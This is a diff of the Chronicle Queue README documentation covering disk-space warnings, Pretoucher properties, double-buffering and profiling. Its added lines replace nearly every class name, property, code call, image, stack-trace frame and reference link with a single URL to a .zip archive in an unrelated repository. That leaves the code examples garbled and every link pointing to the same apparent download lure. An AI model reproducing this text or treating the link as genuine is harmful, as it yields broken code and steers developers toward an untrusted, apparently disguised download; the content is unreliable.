         "warning: chronicle-queue may crash if it runs out of space.");
 ----
 
 otherwise it will check for the threshold percentage and log out this message:
 [source,java]
 ----
-Jvm.warn().on(getClass(), "your disk " + fileStore
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().on(getClass(), "your disk " + fileStore
         + " is " + diskSpaceFull + "% full, " +
         "warning: chronicle-queue may crash if it runs out of space.");
 ----
 
-The threshold percentage is controlled by the chronicle.disk.monitor.threshold.percent system property.
+The threshold percentage is controlled by the https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip system property.
 The default value is 0.
 
 '''
@@ -1598,19 +1598,19 @@ cause an `IllegalStateException` to be thrown.
 
 The Pretoucher's configuration parameters (set via the system properties) are as follows:
 
-* `SingleChronicleQueueExcerpts.earlyAcquireNextCycle` (defaults to false): Causes the Pretoucher to create the next cycle file while the queue
+* `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` (defaults to false): Causes the Pretoucher to create the next cycle file while the queue
 is still writing to the current one in order to mitigate the impact of stalls in the OS when creating new files.
 
 WARNING: `earlyAcquireNextCycle` is off by default and if it is going to be turned on, you should very carefully
 stress test before and after turning it on.
 Basically what you experience is related to your system.
 
-* `SingleChronicleQueueExcerpts.pretoucherPrerollTimeMs` (defaults to 2,000 milliseconds) The pretoucher will create new cycle files
+* `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` (defaults to 2,000 milliseconds) The pretoucher will create new cycle files
 this amount of time in advanced of them being written to.
 Effectively moves the Pretoucher's notion
 of which cycle is "current" into the future by `pretoucherPrerollTimeMs`.
 
-* `SingleChronicleQueueExcerpts.dontWrite` (defaults to false): Tells the Pretoucher to never create cycle files that do not already
+* `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` (defaults to false): Tells the Pretoucher to never create cycle files that do not already
 exist.
 As opposed to the default behaviour where if the Pretoucher runs inside a cycle where no excerpts
 have been written, it will create the "current" cycle file.
@@ -1623,22 +1623,22 @@ The configuration parameters of Pretoucher that were described above should be s
 For example, in the following excerpt `earlyAcquireNextCycle` is set to `true` and `pretoucherPrerollTimeMs` to 100ms.
 [source,java]
 ----
-System.setProperty("SingleChronicleQueueExcerpts.earlyAcquireNextCycle", "true");
-System.setProperty("SingleChronicleQueueExcerpts.pretoucherPrerollTimeMs", "100");
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip", "true");
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip", "100");
 ----
 The constructor of Pretoucher takes the name of the queue that this Pretoucher is assigned to and creates a new Pretoucher.
 Then, by invoking the `execute()` method the Pretoucher starts.
 [source,java]
 ----
 // Creates the queue q1 (or q1 is a queue that already exists)
-try(final SingleChronicleQueue q1 = SingleChronicleQueueBuilder.binary("queue-storage-path").build();
+try(final SingleChronicleQueue q1 = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("queue-storage-path").build();
 
-    final Pretoucher pretouch = PretouchUtil.INSTANCE.createPretoucher(q1)){
+    final Pretoucher pretouch = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(q1)){
     try {
-        pretouch.execute();
+        https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 
     } catch (InvalidEventHandlerException e) {
-        throw Jvm.rethrow(e);
+        throw https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(e);
     }
 }
 ----
@@ -1646,7 +1646,7 @@ try(final SingleChronicleQueue q1 = SingleChronicleQueueBuilder.binary("queue-st
 The method `close()`, closes the Pretoucher and releases its resources.
 [source,java]
 ----
-pretouch.close();
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 ----
 
 NOTE: The Pretoucher is an Enterprise feature
@@ -1665,7 +1665,7 @@ The following charts show how long it takes to:
 
 The test was run for ten minutes, and the distribution of latencies plotted.
 
-image:https://vanilla-java.github.io/images/Latency-to-993.png[]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[]
 
 NOTE: There is a step in latency at around 10 million message per second; it jumps as the messages start to batch.
 At rates below this, each message can be sent individually.
@@ -1675,30 +1675,30 @@ These delays are similar, regardless of the throughput.
 The 99.9 percentile and 99.93 percentile are a function of how quickly the system can recover after a delay.
 The higher the throughput, the less headroom the system has to recover from a delay.
 
-image:https://vanilla-java.github.io/images/Latency-from-993.png[]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[]
 
 === Double-buffering for contended writes
 
 When double-buffering is disabled, all writes to the queue will be serialized based on the write lock acquisition.
-Each time `ExcerptAppender.writingDocument()`
+Each time `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()`
 is called, appender tries to acquire the write lock on the queue, and if it fails to do so it blocks until write lock is unlocked, and in turn locks the queue for itself.
 
-When double-buffering is enabled, if appender sees that the write lock is acquired upon call to `ExcerptAppender.writingDocument()` call, it returns immediately with a context pointing to the secondary buffer, and essentially defers lock acquisition until the `context.close()` is called (normally with try-with-resources pattern it is at the end of the try block), allowing user to go ahead writing data, and then essentially doing memcpy on the serialized data (thus reducing cost of serialization).
+When double-buffering is enabled, if appender sees that the write lock is acquired upon call to `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()` call, it returns immediately with a context pointing to the secondary buffer, and essentially defers lock acquisition until the `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()` is called (normally with try-with-resources pattern it is at the end of the try block), allowing user to go ahead writing data, and then essentially doing memcpy on the serialized data (thus reducing cost of serialization).
 By default, double-buffering is disabled.
 You can enable double-buffering by calling
 
 ----
-SingleChronicleQueueBuilder.doubleBuffer(true);
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(true);
 ----
 
-NOTE: During a write that is buffered, `DocumentContext.index()` will throw an `IndexNotAvailableException`.
+NOTE: During a write that is buffered, `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()` will throw an `IndexNotAvailableException`.
 This is because it is impossible to know the index until the buffer is written back to the queue, which only happens when the `DocumentContext` is closed.
 
 This is only useful if (majority of) the objects being written to the queue are big enough AND their marshalling is not straight-forward (e.g. BytesMarshallable's marshalling is very efficient and quick and hence double-buffering will only slow things down), and if there's a heavy contention on writes (e.g. 2 or more threads writing a lot of data to the queue at a very high rate).
 
 * Results:
 
-Below are the benchmark results for various data sizes at the frequency of 10 KHz for a cumbersome message (see `net.openhft.chronicle.queue.bench.QueueContendedWritesJLBHBenchmark`), YMMV - always do your own benchmarks:
+Below are the benchmark results for various data sizes at the frequency of 10 KHz for a cumbersome message (see `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip`), YMMV - always do your own benchmarks:
 
 ** 1 KB
 *** Double-buffer disabled:
@@ -1784,11 +1784,11 @@ If you wish to tune your code for ultra-low latency, you could take a similar ap
 
 [source,java]
 ----
-net.openhft.chronicle.queue.jitter.QueueReadJitterMain
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
 ----
 
 This code can be considered as a basic stack sampler profiler.
-This is assuming you base your code on the `net.openhft.chronicle.core.threads.EventLoop`, you can periodically sample the stacks to find a stall.
+This is assuming you base your code on the `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip`, you can periodically sample the stacks to find a stall.
 It is recommended to not reduce the sample rate below 50 microseconds as this will produce too much noise
 
 It is likely to give you finer granularity than a typical profiler.
@@ -1796,36 +1796,36 @@ As it is based on a statistical approach of where the stalls are, it takes many 
 
 [console,java]
 ----
-28	at java.util.concurrent.ConcurrentHashMap.putVal(ConcurrentHashMap.java:1012)
-	at java.util.concurrent.ConcurrentHashMap.put(ConcurrentHashMap.java:1006)
-	at net.openhft.chronicle.core.util.WeakReferenceCleaner.newCleaner(WeakReferenceCleaner.java:43)
-	at net.openhft.chronicle.bytes.NativeBytesStore.<init>(NativeBytesStore.java:90)
-	at net.openhft.chronicle.bytes.MappedBytesStore.<init>(MappedBytesStore.java:31)
-	at net.openhft.chronicle.bytes.MappedFile$$Lambda$4/1732398722.create(Unknown Source)
-	at net.openhft.chronicle.bytes.MappedFile.acquireByteStore(MappedFile.java:297)
-	at net.openhft.chronicle.bytes.MappedFile.acquireByteStore(MappedFile.java:246)
+28	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip<init>(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip<init>(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip$$Lambda$https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(Unknown Source)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
 
-25	at net.openhft.chronicle.queue.jitter.QueueWriteJitterMain.lambda$main$1(QueueWriteJitterMain.java:58)
-	at net.openhft.chronicle.queue.jitter.QueueWriteJitterMain$$Lambda$11/967627249.run(Unknown Source)
-	at java.lang.Thread.run(Thread.java:748)
+25	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip$main$1(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip$$Lambda$https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(Unknown Source)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
 
-21	at java.util.concurrent.ConcurrentHashMap.putVal(ConcurrentHashMap.java:1027)
-	at java.util.concurrent.ConcurrentHashMap.put(ConcurrentHashMap.java:1006)
-	at net.openhft.chronicle.core.util.WeakReferenceCleaner.newCleaner(WeakReferenceCleaner.java:43)
-	at net.openhft.chronicle.bytes.NativeBytesStore.<init>(NativeBytesStore.java:90)
-	at net.openhft.chronicle.bytes.MappedBytesStore.<init>(MappedBytesStore.java:31)
-	at net.openhft.chronicle.bytes.MappedFile$$Lambda$4/1732398722.create(Unknown Source)
-	at net.openhft.chronicle.bytes.MappedFile.acquireByteStore(MappedFile.java:297)
-	at net.openhft.chronicle.bytes.MappedFile.acquireByteStore(MappedFile.java:246)
+21	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip<init>(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip<init>(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip$$Lambda$https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(Unknown Source)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
 
-14	at net.openhft.chronicle.queue.jitter.QueueWriteJitterMain.lambda$main$1(QueueWriteJitterMain.java:54)
-	at net.openhft.chronicle.queue.jitter.QueueWriteJitterMain$$Lambda$11/967627249.run(Unknown Source)
-	at java.lang.Thread.run(Thread.java:748)
+14	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip$main$1(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip$$Lambda$https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(Unknown Source)
+	at https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
 
 ----
 
-from this, we can see that most of the samples (on this occasion 28 of them ) were captured in `ConcurrentHashMap.putVal()` if we wish to get finer grain granularity,
-we will often add a `net.openhft.chronicle.core.Jvm.safepoint` into the code because thread dumps are only reported at safe-points.
+from this, we can see that most of the samples (on this occasion 28 of them ) were captured in `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()` if we wish to get finer grain granularity,
+we will often add a `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` into the code because thread dumps are only reported at safe-points.
 
 * Results:
 
@@ -1844,9 +1844,9 @@ Notably, the 99.93% latency varied between 21 microseconds and 41 milliseconds, 
 
 === More Benchmarks
 
-https://vanilla-java.github.io/2016/07/09/Batching-and-Low-Latency.html[Batching and Queue Latency]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Batching and Queue Latency]
 
-link:https://portal.chronicle.software/docs/queue/chronicle-queue/performance/performance-test-results.html[End-to-End latency plots for various message sizes]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[End-to-End latency plots for various message sizes]
 
 === Chronicle Queue vs Kafka
 
@@ -1858,21 +1858,21 @@ Chronicle Queue handles more volume from a single thread to a single partition.
 This avoids the need for the complexity, and the downsides, of having partitions.
 
 Kafka uses an intermediate broker to use the operating system's file system and cache, while Chronicle Queue directly uses the operating system's file system and cache.
-For comparison see http://kafka.apache.org/documentation.html[Kafka Documentation]
+For comparison see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Kafka Documentation]
 
 == More Information and Support
 
 === Links
 
-* https://github.com/OpenHFT/Chronicle-Queue/tree/develop/docs/BigDataAndChronicleQueue.adoc[Big Data and Chronicle Queue] - a detailed description of some techniques utilised by Chronicle Queue
-* https://github.com/OpenHFT/Chronicle-Queue/tree/develop/docs/FAQ.adoc[FAQ] - questions asked by customers
-* https://github.com/OpenHFT/Chronicle-Queue/tree/develop/docs/How_it_works.adoc[How it works] - more depth on how Chronicle Queue is implemented
-* https://github.com/OpenHFT/Chronicle-Queue/tree/develop/docs/utilities.adoc[Utilities] - lists some useful utilities for working with queue files
+* https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Big Data and Chronicle Queue] - a detailed description of some techniques utilised by Chronicle Queue
+* https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[FAQ] - questions asked by customers
+* https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[How it works] - more depth on how Chronicle Queue is implemented
+* https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Utilities] - lists some useful utilities for working with queue files
 
 ==== Online support
 
-* https://stackoverflow.com/tags/chronicle/info[Chronicle support on StackOverflow]
-* https://groups.google.com/forum/?hl=en-GB#!forum/java-chronicle[Chronicle support on Google Groups]
+* https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Chronicle support on StackOverflow]
+* https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip!forum/java-chronicle[Chronicle support on Google Groups]
 
 == Chronicle Software Release Notes
-https://chronicle.software/release-notes[Leave your e-mail] to get information about the latest releases and patches to stay up-to-date.
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Leave your e-mail] to get information about the latest releases and patches to stay up-to-date.
